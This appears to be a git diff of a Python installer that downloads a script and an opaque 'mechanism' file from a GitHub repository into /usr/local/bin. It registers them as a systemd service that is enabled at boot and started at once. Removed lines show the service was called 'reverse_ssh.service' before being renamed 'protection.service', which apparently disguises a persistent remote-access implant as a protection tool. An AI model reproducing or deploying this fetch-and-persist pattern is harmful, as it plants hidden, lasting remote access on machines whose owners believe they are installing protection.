@@ -4,12 +4,10 @@ import os
 import sys
 import subprocess
 
-
 # Define URLs for downloading the necessary files
 repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
-
 
 # Define the output file paths
 envPath = "/usr/local/bin/protectionEnv"
@@ -19,37 +17,38 @@ requirementsFilePath = "/usr/local/bin/requirements.txt"
 contentFilePath = "/usr/local/bin/mechanism"
 serviceFilePath = "/etc/systemd/system/protection.service"
 
+# Function to create a virtual environment and install requests
+def create_virtual_environment(env_path):
+    try:
+        # Create the virtual environment
+        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)
+        print(f"Virtual environment created at {env_path}")
+
+        # Install 'requests' in the virtual environment
+        pip_executable = os.path.join(env_path, 'bin', 'pip')
+        subprocess.run([pip_executable, 'install', 'requests'], check=True)
+        print("'requests' library installed successfully.")
+
+        return True
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to set up virtual environment or install 'requests'. Error: {e}")
+        return False
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        return False
+
 # Function to download a file and save it locally
 def download_file(url, file_path):
     try:
+        import requests  # Importing here to ensure it's available in the environment
         response = requests.get(url)
         response.raise_for_status()
         with open(file_path, 'wb') as file:
             file.write(response.content)
+        print(f"Downloaded {file_path} successfully.")
     except requests.exceptions.RequestException as e:
+        print(f"Failed to download {file_path}. Error: {e}")
         pass
-
-# Function to create a virtual environment and install requirements
-def setup_python_environment(env_path, requirements_path):
-    try:
-        # Create the virtual environment
-        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)
-
-        # Check if the requirements file exists
-        if not os.path.exists(requirements_path):
-            return None
-
-        # Install requirements
-        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
-        subprocess.run([pip_executable, 'install', '-r', requirements_path], check=True)
-        
-        return pip_executable  # Return pip path for service configuration if needed
-
-    except subprocess.CalledProcessError as e:
-        return None
-    except Exception as e:
-        return None
-
 
 # Function to create a systemd service file (Linux only)
 def create_service_file(service_file_path, python_path):
@@ -73,7 +72,9 @@ WantedBy=multi-user.target
     try:
         with open(service_file_path, 'w') as f:
             f.write(service_content)
+        print(f"Service file created at {service_file_path}.")
     except Exception as e:
+        print(f"Failed to create service file. Error: {e}")
         pass
 
 
@@ -81,19 +82,27 @@ WantedBy=multi-user.target
 def make_executable(file_path):
     try:
         os.chmod(file_path, 0o755)
+        print(f"{file_path} is now executable.")
     except Exception as e:
+        print(f"Failed to set executable permissions for {file_path}. Error: {e}")
         pass
 
+
 if __name__ == "__main__":
+    # Step 1: Create the virtual environment and install 'requests'
+    if not create_virtual_environment(envPath):
+        sys.exit("Failed to create virtual environment or install 'requests'. Exiting.")
 
-    # Download requests from pip first
-    import requests
+    # Step 2: Use the virtual environment's Python for the rest of the script
+    os.environ['VIRTUAL_ENV'] = envPath
+    os.environ['PATH'] = f"{os.path.join(envPath, 'bin')}:{os.environ['PATH']}"
 
-    # Download the files
+    # Step 3: Download the necessary files
     download_file(repoUrl, repoFilePath)
     download_file(requirementsUrl, requirementsFilePath)
     download_file(contentUrl, contentFilePath)
 
+    print("[!] Files saved successfully.")
 
     # Make the main script executable
     make_executable(repoFilePath)
@@ -110,7 +119,8 @@ if __name__ == "__main__":
     subprocess.run(['systemctl', 'daemon-reload'], check=True)
 
     # Enable the service to run at boot
-    subprocess.run(['systemctl', 'enable', 'reverse_ssh.service'], check=True)
+    subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)
 
     # Start the service immediately
-    subprocess.run(['systemctl', 'start', 'reverse_ssh.service'], check=True)
+    subprocess.run(['systemctl', 'start', 'protection.service'], check=True)
+
